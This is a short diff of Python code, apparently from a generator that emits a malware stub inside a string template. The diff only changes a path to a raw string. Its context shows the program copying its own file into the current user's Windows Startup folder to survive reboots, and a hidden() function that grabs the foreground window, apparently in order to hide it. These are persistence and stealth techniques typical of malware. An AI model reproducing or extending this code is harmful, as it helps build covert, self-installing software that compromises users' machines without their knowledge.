@@ -9,7 +9,7 @@ from win32con import SW_HIDE
 import win32gui
 from getpass import getuser
 username = getuser() # Get The Current Username 
-startup = 'C:\\Users\\"{}"\\AppData\\Roaming\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup'.format(username)   
+startup = r'C:\\Users\\"{}"\\AppData\\Roaming\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup'.format(username)   
 os.system("copy {} {}".format(__file__ , startup)) # Copy This File To Startup Directory'''.format("{}","{}","{}")+'''
 def hidden():
     pid = win32gui.GetForegroundWindow()
